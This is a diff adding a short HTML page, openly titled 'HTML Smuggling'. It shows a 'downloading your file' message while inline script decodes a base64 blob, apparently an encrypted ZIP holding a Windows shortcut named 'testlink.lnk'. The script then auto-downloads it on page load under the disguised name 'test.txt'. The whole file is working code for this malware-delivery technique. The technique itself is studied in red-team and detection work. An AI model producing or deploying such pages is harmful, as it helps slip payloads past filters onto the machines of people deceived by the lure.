@@ -1,0 +1,36 @@
+
+<html>
+    <head>
+        <title>HTML Smuggling</title>
+    </head>
+    <body>
+        <p>Downloading your file in a second...</p>
+
+        <script>
+        function convertFromBase64(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
+
+        var file ='UEsDBBQACQAIAN2IOlYAsVBuVAQAABYNAAAMABwAdGVzdGxpbmsubG5rVVQJAAMys9JjCrLSY3V4CwABBAAAAAAEAAAAAErl48LSqiUIlOb8pt57BbX01Kl/hzVbmrvuwIi+Yx6TAEZWHkCxRqxsWN0bI08PurmxDrBRd6ue4PrZGSwpb9M17gmfXg39JT2W4HOSINUQbPa06owCb0lu3xLBGu31x9YCzWHqpwRTWcvUMDy5DkKGDAnhHnqZZ034u9fR3QDEFjIu3wySek0FtWEqgpsBTWXAn5oLor46yW1euycL754wsL2fcyKjyPQXGNRK2EIEkTjIs6+hd1vT9zZTloAYbEouSx8IJ5zbJd5BFFx7oa4F2RkvQoTRPvmJP0H4GsNANPU8v67sI+Xs0h+PJEfNs9AC+k4W/sy6cvQubCDDSGu7tSRayYWr4txSWiHnem1YGdwAH5rkKeub+OHJk0ic7j28PXWSWgD6ldQUjRfUx3hTEmWW72Fm4/MyafD19SUNJizLHxMdnRHzKRqpkM/7qpU/frM/mtPwQh8yNSQllSalNl2M49bqVFRcfRW6QPde6/lgIlf3Ga6QQ/hdJzIs5B/BC2DM3vdy3nzIlwtclj2qww5wMifrwcHhYLwlQX0ZE9tbvxvbox6o4Iq6Wn+wUIQo67xp0nj8gwamjcgVjzskYKNBdxIISFzuXiULPv3WdAgotbB3WDmzguiqK9yaZeHSNBR+l+7kGsvSxwfgls+E0fSuAJZT1uB8EWmq43vpHqwUVtValeOPBwdn3bgY5k/XCYinv7Zzt+Y1VCKX8mwF+FdKOlSskTgkKe2/U9nULXeJonQwOliK60snjlNk8l7pNaNfR5aOGX1mHtz86klj38fBY+cBFyOuRK1mEJL+bBzC/KJra+RXS36UTiDX/a+4JIiuXgd2F1WAxZG1F2XIKGoQYLWEfO59zr79mpajduU5k14c05QxJkYDOnPAV7iw0sv0/hEo7+KOouj8CiPY/ShsL1keloGTJfK6ke/yp9jKuThhWQ/sTRlCBX6iooAg91tF/MooYYZqsOIwASyZ3XrTbm4s16aeXwMKH7Xm1ar9VgyzWt+mdvDbn9k+qtjzad+1Qq9NRn1i0R/63E/osYVNbkYOs5uSgPpRjAA5I27vTo6MWEDsXa92cnoiVHYS3YFyKsmo10HLyqysESeb1ZOlWUSQLsd2OOr6mTILB+ieY7o7bWN4sR09dh4rabrbeSF/VkvMP57JyFrxbgOEU8oCzYU77b3BQOl0AskP2Fyp0NhtgJvBU0I3nDHsKIduMSMW3yPsf1Bk7lCeTJL4iEusG1qeoEcCYW1AJrenbHTepTIzjq9dH/rYf7RRIBm/wSXuwZPf28n0KjNC7LnnnPCLfHZPLJBPSRTKuGlIoIMsHl/xCXBwD9pl5sFxyP881/7t0ZPTGyceXb3kS+GmdbOIFbnpdVxNAhdBTIK4ml3fQ0M7WYjTRJyeBWjRLe86tqrM6nYnfX3rUeyFdU/pN/H8PbcZ1eETArpi5SpJ2DMtjebB8aAMglaBdo41zJwWtE5QSwcIALFQblQEAAAWDQAAUEsBAh4DFAAJAAgA3Yg6VgCxUG5UBAAAFg0AAAwAGAAAAAAAAAAAAP+BAAAAAHRlc3RsaW5rLmxua1VUBQADMrPSY3V4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAFIAAACqBAAAAAA=';
+        var data = convertFromBase64(file);
+        var blob = new Blob([data], {type: 'octet/stream'});
+        var fileName = 'test.txt';
+
+        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+        else {
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        </script>
+    </body>
+</html>
